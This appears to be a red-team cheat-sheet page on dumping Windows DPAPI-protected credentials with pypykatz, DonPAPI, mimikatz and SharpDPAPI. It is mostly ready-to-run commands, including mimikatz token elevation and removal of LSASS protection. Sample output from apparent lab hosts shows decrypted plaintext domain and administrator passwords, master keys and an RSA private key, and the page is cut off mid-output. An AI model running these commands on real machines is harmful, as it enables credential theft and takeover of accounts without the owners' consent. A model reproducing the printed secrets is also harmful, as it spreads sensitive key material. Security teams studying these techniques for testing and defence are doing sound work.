---
title: "DPAPI"
date: 2024-7-31
tags: ["Credential Dumping", "Mimikatz", "DPAPI", "Windows", "Password", "Donpapi"]
---

### Abuse #1: Credentials dump (From Linux)

{{< tab set1 tab1  >}}pypykatz{{< /tab >}}
{{< tab set1 tab2 >}}DonPAPI{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Info Gathering

```console
cmd /c "dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Protect"
```

#### 2. Retrieve Keys

```console
# Get master key
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY>" C:\ProgramData\<MASTERKEY>
```

```console
# Copy and paste to local Linux
type C:\ProgramData\<MASTERKEY>
```

```console
# Base64 decode
cat masterkey_b64 | base64 -d > masterkey_file
```

```console
# Get credential
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>" C:\ProgramData\<CREDENTIALS_HASH>
```

```console
# Copy and paste to local Linux
type C:\ProgramData\<CREDENTIALS_HASH>
```

```console
# Base64 decode
cat credential_b64 | base64 -d > credential_file
```

#### 3. Decrypt credentials

```console
pypykatz dpapi prekey password <SID> '<PASSWORD>' | tee pkf
```

```console
pypykatz dpapi masterkey masterkey_file pkf -o mkf
```

```console
pypykatz dpapi credential mkf credential_file
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# With password
DonPAPI collect -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -t <TARGET>
```

```console
# With hash
DonPAPI collect -d <DOMAIN> -u '<USER>' -H <HASH> -t <TARGET>
```

<small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>

{{< /tabcontent >}}

### Abuse #1: Credentials dump (From Windows)

{{< tab set2 tab1  >}}mimikatz{{< /tab >}}
{{< tab set2 tab2 >}}SharpDPAPI{{< /tab >}}
{{< tab set2 tab3 >}}sliver{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Info Gathering

```console
cmd /c "dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Protect"
```

```console {class="sample-code"}
PS C:\users\PPotts> cmd /c "dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Protect"

 Volume in drive C has no label.
 Volume Serial Number is C626-9388
File Not Found
 Volume in drive C has no label.
 Volume Serial Number is C626-9388

...[SNIP]...

 Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials

05/09/2023  04:14 PM    <DIR>          .
01/18/2024  10:34 AM    <DIR>          ..
05/09/2023  02:08 PM               358 18A1927A997A794B65E9849883AC3F3E
05/09/2023  04:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
01/18/2024  12:53 PM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
               3 File(s)          1,130 bytes

     Total Files Listed:
               3 File(s)          1,130 bytes
               2 Dir(s)   5,175,238,656 bytes free
 Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Protect

05/04/2023  10:58 AM    <DIR>          .
01/18/2024  10:34 AM    <DIR>          ..
05/02/2023  04:13 PM                24 CREDHIST
01/17/2024  04:43 PM    <DIR>          S-1-5-21-1199398058-4196589450-691661856-1107
01/17/2024  05:06 PM                76 SYNCHIST
               2 File(s)            100 bytes

 Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107

09/23/2024  06:03 AM    <DIR>          .
05/04/2023  10:58 AM    <DIR>          ..
01/17/2024  04:43 PM               740 10811601-0fa9-43c2-97e5-9bef8471fc7d
05/02/2023  04:13 PM               740 191d3f9d-7959-4b4d-a520-a444853c47eb
09/23/2024  06:03 AM               740 6b478281-d87d-4854-b2d2-ae22b861b0b0
05/02/2023  04:13 PM               900 BK-OFFICE
09/23/2024  06:03 AM                24 Preferred
               5 File(s)          3,144 bytes

     Total Files Listed:
               7 File(s)          3,244 bytes
               5 Dir(s)   5,175,238,656 bytes free

```

#### 2. Decrypt credentials

{{< tab set2-1 tab1 active >}}With Password{{< /tab >}}{{< tab set2-1 tab2 >}}Without Password{{< /tab >}}
{{< tabcontent set2-1 tab1 >}}

```console
.\mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>" "dpapi::masterkey /in:C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID> /sid:<SID> /password:<PASSWORD> /protected" "dpapi::cred /in:C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>" "exit"
```

```console {class="sample-code"}
PS C:\programdata> .\mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23" "dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected" "dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 43721          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 20307805    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20868764    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # !+
ERROR kuhl_m_kernel_add_mimidrv ; kull_m_file_isFileExist (0x00000002)

mimikatz(commandline) # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 772 -> 00/00 [0-0-0]
ERROR kull_m_kernel_ioctl ; CreateFile (0x00000002)

mimikatz(commandline) # dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23
**BLOB**

...[SNIP]...

mimikatz(commandline) # dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected
**MASTERKEYS**

...[SNIP]...

[masterkey] with password: D43d4lusB1ll1ngB055 (protected user)
  key : 0d0f6c2fafd985bff92ff1371723795de81064978fbf37e4f0b87d5b9b1458077f4264e3e5c5c1407431fb21243b46415c018e34caa943b8c24d0c5834500e73
  sha1: 1312251fb1ae77dec889c6b88f391ad10bf59d87

[backupkey] without DPAPI_SYSTEM: 
  key : 5a2ca08f7d08301826f1e25c618e87797726d4d97cfda4f6a2ed08bcaae9a591
  sha1: 3c85ebb19e92e325e28d715759fdac387c2934ff

mimikatz(commandline) # dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23
**BLOB**

...[SNIP]...

Decrypting Credential:
 * volatile cache: GUID:{56a4e7f0-7ae5-4a66-86c8-abb9aa484acd};KeyHash:1312251fb1ae77dec889c6b88f391ad10bf59d87;Key:available
**CREDENTIAL**

...[SNIP]...

  TargetName     : Domain:interactive=DAEDALUS\svc_backup
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : DAEDALUS\svc_backup
  CredentialBlob : jkQXAnHKj#7w#XS$
  Attributes     : 0

mimikatz(commandline) # exit
Bye!
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab2 >}}

```console
# Try different MASTERKEY_GUID to get masterkeys
.\mimikatz.exe "dpapi::masterkey /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /rpc" "exit"
```

```console {class="sample-code"}
PS C:\programdata> .\mimikatz.exe "dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
**MASTERKEYS**

...[SNIP]...

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77

mimikatz(commandline) # exit
Bye!
```

```console
# Decrypt credentials
.\mimikatz.exe "dpapi::cred /in:C:\users\<USER>\appdata\roaming\microsoft\credentials\<CREDENTIALS_HASH> /masterkey:<MASTERKEY>" "exit"
```

```console {class="sample-code"}
PS C:\programdata> .\mimikatz.exe "dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**

...[SNIP]...

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0

mimikatz(commandline) # exit
Bye!
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
# Run as system
.\SharpDPAPI.exe machinetriage
```

```console {class="sample-code"}
PS C:\programdata> .\SharpDPAPI.exe machinetriage

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.12.0                               


[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage

[*] Secret  : DPAPI_SYSTEM
[*]    full: E7BC9098EA7313E0B042679565EDF75CAD219106D3FE11B0F39C1F1E4EAEA01DC393F563C6190EC7
[*]    m/u : E7BC9098EA7313E0B042679565EDF75CAD219106 / D3FE11B0F39C1F1E4EAEA01DC393F563C6190EC7


[*] SYSTEM master key cache:

{0415ef8e-0ae0-4238-9240-90f873b07eb8}:4F31CF838C52B4DC1C4E2DCD09023316D31B661F
{3faada0f-c676-4092-a21d-98749e7035bd}:F630D3478DF2CE72B996D6A90A33286F5B12412A
{40956580-28e9-4cdc-bd5a-f7f5d3296e3c}:2A7A3BF8741AAC73F8ECD2F1CCC802397037EFA4
{49b474c3-bbf4-4a92-95cc-4a47b486efec}:CDA2D0F05AC1D0F9F126D742379528471C765D69
{9266b8e6-64b8-423c-b8e9-4b5de4fe1a8d}:70F37E3A70076DEA98EB86CACF6511CB2541E71E
{c3b44c78-2d7b-4542-9078-22b1e73d9575}:67AF7D6FB8BAC73F31001612B697D27337C0EC53
{df49e508-6894-491b-9d8f-aefc03890813}:C0D4E38607CCC1A0956F5AB1B878021FCF9D6FD4
{e0131457-419d-4905-a547-fadb0cacdd84}:9AF3645C9A2D7A5DBFDAA15133A9AF22641E7710
{17c48be0-e86b-4d5f-883d-994e1dc7ad8e}:794C081F748977CAB0DFC74BC4893DC7D5A73B03
{1ef7b31a-39fd-4309-877e-c354d5a19506}:4D8998194D3BB189C3C4328DBEB029477139B705
{6285f725-430d-4155-8bf0-2a09fe7aa629}:3B8331A70BD0F676CC34478FAECD66FB1FE7C2C1
{6977da93-ec45-468e-8a19-97d9865fb2e6}:FE97D22DAD2830B6D033CA17D0400C67246E8B22
{79e99075-9dfe-462b-bd58-82ea4508fdb4}:C9E0128D54AEF84D1149D2417A031D168CB24BB2
{a0c34700-bcf5-4dc6-8831-76fe66b74b2c}:3FABB64C6733FADEFAFB460CF25752C49F45C343
{a8deeb85-2a00-4648-8024-a1bff4f382ff}:6C113015CF9FCFE39A2AAF6F27FB8E6842F06206
{b2014c7b-a5e1-4748-bd7f-3f9edf9ee407}:7EF463C6ED7EFC79E7BEA0281C8DC74909D00D60
{dcc6f49e-c207-47c0-b3ba-959ad25c2abb}:D4D4C8B9CB8671653EDDCE39B9B232E499908202
{e892348e-5a34-4a9a-bd46-2f5f3186318b}:32EDF8DB273EDB19A10C2124DA5678CBBBECEF72


[*] Triaging System Credentials


Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : ADBAA7254AF7B3AC4CBF7B8CE9BD6911

    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 10/13/2020 10:49:57 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{27B6CB8A-0163-46AB-A0C7-387E45A70048}
    TargetAlias      : 
    Comment          : 
    UserName         : WEB01\svc_dev
    Credential       : a2W@rWAHzG+zQrB4

  CredFile           : AF61A1B16221450058FB4D69F7B3FE73

    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 10/14/2020 10:15:19 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{64EDB31F-E848-4632-8F9F-377559BFA088}
    TargetAlias      : 
    Comment          : 
    UserName         : WEB01\Administrator
    Credential       : EXuLyX_WtHxx9pS9

  CredFile           : CEED724993CAA9310FC2FE2F72ECE137

    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
    size             : 592
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 10/13/2020 2:56:34 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{D3000B16-D5D6-4FF3-9038-F368155DBB77}
    TargetAlias      : 
    Comment          : 
    UserName         : DAEDALUS\Administrator
    Credential       : pleasefastenyourseatbelts01!


Folder       : C:\WINDOWS\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
    size             : 11152
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 9/30/2020 10:33:42 AM
    TargetName       : WindowsLive:target=virtualapp/didlogical
    TargetAlias      : 
    Comment          : PersistedCredential
    UserName         : 02sxobiqthvopecv
    Credential       : 


Folder       : C:\WINDOWS\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {e892348e-5a34-4a9a-bd46-2f5f3186318b}
    size             : 11152
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 9/30/2020 12:34:45 PM
    TargetName       : WindowsLive:target=virtualapp/didlogical
    TargetAlias      : 
    Comment          : PersistedCredential
    UserName         : 02uqnqqpyctvsadl
    Credential       : 


[*] Triaging SYSTEM Vaults


[*] Triaging Vault folder: C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Name               : Web Credentials
    guidMasterKey    : {a0c34700-bcf5-4dc6-8831-76fe66b74b2c}
    size             : 324
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : 
    aes128 key       : 2A78776BD367E217F82BD81DF6F57940
    aes256 key       : 768D205AA00F351A21332400E62DEEDBDBCBE7F9C3D199035980AEB63519C91A

[*] Triaging System Certificates


Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys

  File               : fad662b360941f26a1193357aab3c12d_eb299db7-a1dc-47c1-a38b-55aee2a196d9

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {3faada0f-c676-4092-a21d-98749e7035bd}
    Description      : CryptoAPI Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : 6af43bd696af086ebf84ec9a98313fc9ee1ed78bda6edbc195f8e0b474742558
    HMAC             : b6181065e910521a5cbe48c137d2d311d52e473aeec39a668a2d1d484358116c
    Unique Name      : IIS Express Development Certificate Container

    Thumbprint       : 5D1DA81AA907D60C7CA001F70B97C6797D1452E6
    Issuer           : CN=localhost
    Subject          : CN=localhost
    Valid Date       : 11/14/2019 5:09:23 AM
    Expiry Date      : 11/13/2024 4:00:00 PM
    Enhanced Key Usages:
        Server Authentication (1.3.6.1.5.5.7.3.1)

    [*] Private key file fad662b360941f26a1193357aab3c12d_eb299db7-a1dc-47c1-a38b-55aee2a196d9 was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAt6bH9rl7JOVpmoan7iHPmj5IkCLASISSb4ZycbDsXZp9Ixvf
lEriTEFxcjB7+PbeO2b0AYpzW+Y/sf8BQPuBVmyDwmrmha0Y4+KznPQFK2I7Hk73
3Fi5mLOWaCAKhFVNcYyMbBrA40aeHJ8M/4aSJpwgP+KeU9lQ87lfK/XJYUWaANVl
yw18CPhBJ4Ky4GuTudxD721eHGhEbRjhyY7WqnLpz/ib6c3TE++Qe13oLDXkJ/yQ
sE9OyoFfF+gcfX/Dpc9XRZxobLNamwp62a1sVFMcLpWLYy46OWw7btoUA+LcWR2g
TcZgph44v+BnK0eTnqZ7K8kmCnF7Y1CI7pFQ6wIDAQABAoH/DAS6R/IBBuJHoj1M
asJDJ2YAiXULPw/UXH7iSYeXU07RbZfGqKRZOIxsAJq0M74ImeTSs4SNfCXsU7Eq
/yUJLfW/pj93aVJZkTQdjQCvamaNiPGlczhvsuWZvU6Y7Yr5eoQ0uf0as3nVawNB
4nOb2KNRVtYf6WBACPrWDh0yTFJ4onaKmN/+f9AsX8lSss4h0V7WLhXfdLDi6N8+
Zz21V1xoKayZHZp7ftgBUQBdxWPVCnf7lphappZ8u7zEpjAWanzKN51tMNiEIKIJ
nYDEL0OZbSF4chsJCZwIITa1WN9Mn1Nx9J7E3XSvCiCl97hTM8bNmcAENpkr31Fr
OaFVAoGBALlnw0boVhXyf/h7b1l+NMRMEZABMVfnEcwR0U3KzjlQyQ9vhvLk5IhJ
/zFxGON2nYZnKpXseu31to9aDOcl2bKQ59JTaBQ8UbNO+LblhdD+YF9jxLTKzgAe
OX6R72J1wWWNYNHaJZ0Zmk3NKWxV9SGYoL776y+V591a2SmdTyyFAoGBAP2UEI01
L1TBgAmAlKpLx04BxS8iqnVUWX4nWZua2JRzzbBZS9pGmAeSHx7B111Zda5Euphn
q0nSHSdU9hQ8gqpwqeZdMiHG9i0n+Gy6sQFlK+2iOC8Sk/YcWOYhzKuiMHEsVPzh
qxXHoOsE4Qiox4Eq4BAR0UYrKzbhGjGhmPqvAoGBAJI3v+ya7NFQNxZbGnzEqI6q
wysDlcuSQxnib2PfbnYLPRW8SfwjAgxt9yEh5ZP2BtNpZ09neadTIc+6H/Tnh+Fo
oDriZnGXBIPZ4xIyvy8MfiqcfxRp4L59F7C3HMhUv9n7/oBhf0p/V47GH0X+IF2H
hjY4bMlRetO6gwtrsXYVAoGBAL2lnPNe0XU7+nwg1A7A+eAXZtenv4Bcg0ncOCIu
Hsh4C19WiWpH3a/b0rZ4Fo/UNjUNZdhRwENHh1JBMoFT+A1skUSecr3cRYTkHeGD
hpoahk4FQqvB4zLvZHVI1f+PH1ek5jLyu7dgQ7NBROPrBrpNzKF4EeG+q2Ux2RtB
Vl41AoGARa7flOX1LvXDAHBAJ+95M4+X9aJUCjmPWhce8/mTM/1fVMGQxwp2c5H7
DCOqiohDsIEbpnQlBLerjnv8SFZ77BOueNNqO2skd2WSUX3VyNMlb5nQUrfr5si2
JPnU/5hBG3GioUuBuJSNH0pGzOsr/prbvGEw7jzSCZFcTcXyGYM=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIC7DCCAdSgAwIBAgIQZY3EzYv13Z5Eq3xDgYNfxTANBgkqhkiG9w0BAQsFADAU
MRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMTkxMTE0MTMwOTIzWhcNMjQxMTE0MDAw
MDAwWjAUMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQC3psf2uXsk5WmahqfuIc+aPkiQIsBIhJJvhnJxsOxdmn0jG9+U
SuJMQXFyMHv49t47ZvQBinNb5j+x/wFA+4FWbIPCauaFrRjj4rOc9AUrYjseTvfc
WLmYs5ZoIAqEVU1xjIxsGsDjRp4cnwz/hpImnCA/4p5T2VDzuV8r9clhRZoA1WXL
DXwI+EEngrLga5O53EPvbV4caERtGOHJjtaqcunP+JvpzdMT75B7XegsNeQn/JCw
T07KgV8X6Bx9f8Olz1dFnGhss1qbCnrZrWxUUxwulYtjLjo5bDtu2hQD4txZHaBN
xmCmHji/4GcrR5OepnsrySYKcXtjUIjukVDrAgMBAAGjOjA4MAsGA1UdDwQEAwIE
sDATBgNVHSUEDDAKBggrBgEFBQcDATAUBgNVHREEDTALgglsb2NhbGhvc3QwDQYJ
KoZIhvcNAQELBQADggEBAEMyxPNqorAka7/Qpx9TNULsvbBZFqYsY37mdbL3CMvS
RFFPe7JJGMWb1Fywp1h/iOG3y+QEgn3XR1+XWQ0/uLb9Zl31LGcm6enKfIJeAvzo
cjQCM/pK38djPzNWqK1XvvtxWrObzMqO8nUoNw4uu1p1rASSUhVmfWYJjNfze802
ORnm89Z5w714sB/4QzA4pw0P+RtLuktLaAPFgWrl1Ukv5MsRphKLjV6uOFi92Lin
Ts+LZc2/iqLV6JENHk++Y40MmD+1ubPhCkzyZ+e7iyYAozktLLMAdxHOvSoGrnaF
1KYXlXFpPKlhpAckgu1Ku9DZBgkYfvzMX6agsxMPY+Q=
-----END CERTIFICATE-----



Folder       : C:\ProgramData\Microsoft\Crypto\Keys


Folder       : C:\ProgramData\Microsoft\Crypto\SystemKeys


Folder       : C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys

[*] Retrieving SCCM Network Access Account blobs via WMI
[*]     Connecting to \\localhost\root\ccm\policy\Machine\ActualConfig
[!] Error connecting to WMI: Invalid namespace 


SharpDPAPI completed in 00:00:02.1950513
```

```console
# Run as user
.\SharpDPAPI.exe credentials /password:'<PASSWORD>'
```

```console
# Run as user (without password)
.\SharpDPAPI.exe credentials /rpc
```

```console {class="sample-code"}
PS C:\programdata> .\SharpDPAPI.exe credentials /rpc

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.12.0                               


[*] Action: User DPAPI Credential Triage

[*] Will ask a domain controller to decrypt masterkeys for us

[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d
[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb
[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\6b478281-d87d-4854-b2d2-ae22b861b0b0

[*] Preferred master keys:

C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107:6b478281-d87d-4854-b2d2-ae22b861b0b0

[*] User master key cache:

{10811601-0fa9-43c2-97e5-9bef8471fc7d}:FBAB11CACDD8407E8DB9604F0F8C92178BEE6FD3
{191d3f9d-7959-4b4d-a520-a444853c47eb}:85285EB368BEFB1670633B05CE58CA4D75C73C77
{6b478281-d87d-4854-b2d2-ae22b861b0b0}:9BF69BE7E68435E68C8B1693A84EF951D8DB38E6


[*] Triaging Credentials for current user


Folder       : C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\

  CredFile           : 18A1927A997A794B65E9849883AC3F3E

    guidMasterKey    : {191d3f9d-7959-4b4d-a520-a444853c47eb}
    size             : 358
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 5/9/2023 2:08:54 PM
    TargetName       : LegacyGeneric:target=MyTarget
    TargetAlias      : 
    Comment          : 
    UserName         : MyUser
    Credential       : 

  CredFile           : 84F1CAEEBF466550F4967858F9353FB4

    guidMasterKey    : {191d3f9d-7959-4b4d-a520-a444853c47eb}
    size             : 398
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 5/9/2023 4:03:21 PM
    TargetName       : Domain:interactive=OFFICE\HHogan
    TargetAlias      : 
    Comment          : 
    UserName         : OFFICE\HHogan
    Credential       : H4ppyFtW183#

  CredFile           : E76CCA3670CD9BB98DF79E0A8D176F1E

    guidMasterKey    : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
    size             : 374
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
